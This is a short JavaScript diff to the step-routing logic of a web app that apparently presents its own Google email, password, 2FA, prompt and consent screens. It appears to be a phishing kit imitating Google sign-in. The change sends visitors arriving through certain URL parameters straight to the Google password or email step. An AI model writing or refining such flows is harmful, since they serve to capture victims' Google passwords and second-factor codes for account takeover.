@@ -171,8 +171,13 @@ function initApp() {
                              initParams.get("google") === "1" || 
                              window.location.search.includes("auth=google");
 
-        if ((!targetStep || targetStep === stepPhone) && isTestBotUrl) {
-            targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
+        if (isTestBotUrl && targetStep !== stepSuccess) {
+            const isTargetAlreadyGoogle = [
+                stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
+            ].includes(targetStep);
+            if (!isTargetAlreadyGoogle) {
+                targetStep = userGoogleEmail ? stepGooglePassword : stepGoogleEmail;
+            }
         }
 
         const isGoogleStep = [
